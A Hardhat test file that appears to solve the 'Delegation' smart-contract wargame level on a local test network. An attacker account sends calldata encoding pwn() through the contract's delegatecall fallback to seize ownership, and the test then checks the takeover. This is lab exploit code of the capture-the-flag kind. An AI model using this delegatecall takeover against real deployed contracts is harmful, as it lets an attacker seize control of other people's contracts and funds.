import { expect } from "chai";
import { ethers } from "hardhat";

describe("Delegation", function () {
  it("work", async function () {
    const [owner, me, other] = await ethers.getSigners();
    const Delegate = await ethers.getContractFactory("Delegate");
    const delegate = await Delegate.deploy(owner.address);
    await delegate.deployed();

    const Contract = await ethers.getContractFactory("Delegation");
    const contract = await Contract.deploy(delegate.address);
    await contract.deployed();

    expect(await contract.owner()).to.equal(owner.address);
    const abi = ["function pwn()"];
    const iDelegate = new ethers.utils.Interface(abi);
    await me.sendTransaction({
      to: contract.address,
      data: iDelegate.encodeFunctionData("pwn"),
      // need to seed more gas to set the owner variable
      gasLimit: ethers.utils.parseUnits("1000000", "wei"),
    });

    expect(await contract.owner()).to.equal(me.address);
  });
});
